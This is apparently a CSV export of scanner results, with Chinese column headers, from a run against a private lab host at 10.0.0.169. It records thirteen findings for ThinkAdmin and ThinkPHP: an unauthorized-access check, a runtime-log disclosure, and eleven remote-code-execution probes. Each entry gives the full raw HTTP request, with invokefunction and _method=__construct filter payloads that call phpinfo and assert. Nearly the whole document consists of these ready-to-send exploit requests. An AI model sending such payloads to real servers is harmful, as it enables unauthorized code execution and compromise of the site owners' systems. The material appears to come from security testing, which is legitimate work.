ID,网站地址,脚本,漏洞信息,请求类型,请求包
1,http://10.0.0.169/ThinkAdmin-5/public/index.php/admin/login.html/,plugins/thinkadmin,thinkadmin_unauthorized_access,GET,"GET /ThinkAdmin-5/public/index.php/admin/login.html/?s=admin/ HTTP/1.1
Host: 10.0.0.169
User-Agent: python-requests/2.24.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: s7d589e99=4mar48rgc17aqnp81gfp3hjhq2
"
2,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_log_find,GET,"GET /weipan3/runtime/log/202101/04.log HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
"
3,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,GET,"GET /weipan3/index.php/?s=Index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=-1 HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
"
4,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,GET,"GET /weipan3/index.php/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=assert&vars%5B1%5D%5B%5D=phpinfo() HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
"
5,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=index HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 68
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
"
6,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=index HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 56
_method=__construct&method=get&filter[]=phpinfo&get[]=-1
"
7,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=index/index HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 68
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
"
8,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=index/index HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 56
_method=__construct&method=get&filter[]=phpinfo&get[]=-1
"
9,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php// HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 68
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
"
10,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php// HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 56
_method=__construct&method=get&filter[]=phpinfo&get[]=-1
"
11,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=captcha&test=-1 HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 55
_method=__construct&filter[]=phpinfo&method=GET&get[]=1
"
12,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=captcha HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 55
_method=__construct&filter[]=phpinfo&method=GET&get[]=1
"
13,http://10.0.0.169/weipan3/index.php/,plugins/thinkphp,thinkphp_rce,POST,"POST /weipan3/index.php/?s=captcha&test=phpinfo() HTTP/1.1
Host: 10.0.0.169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7016ugqika52p6pg0bpg4q0t95; think_var=zh-cn
Content-Length: 72
_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1
"
